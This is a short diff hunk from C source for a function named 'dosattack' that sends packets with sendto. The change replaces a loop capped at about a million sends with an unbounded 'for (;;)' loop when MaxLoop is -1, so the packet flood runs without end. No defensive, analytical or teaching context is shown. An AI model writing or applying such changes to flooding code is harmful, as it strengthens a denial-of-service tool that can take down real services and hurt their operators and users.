@@ -164,9 +164,9 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     //Send the packet
     if (ptmp->MaxLoop == -1)
     {
-        int l;
-        //for (;;)
-        for (l = 0; l < 1024000; ++l)
+        //int l;
+        for (;;)
+        //for (l = 0; l < 1024000; ++l)
         {
             if (sendto(
                     socket_fd,               // our socket
